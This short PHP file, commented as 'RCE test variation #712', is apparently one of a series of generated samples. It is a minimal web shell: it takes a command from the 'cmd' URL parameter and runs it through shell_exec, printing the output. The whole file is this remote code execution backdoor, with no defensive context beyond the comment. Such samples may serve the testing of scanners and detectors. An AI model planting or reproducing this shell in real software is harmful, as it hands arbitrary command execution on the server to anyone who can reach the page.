<?php
// RCE test variation #712
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>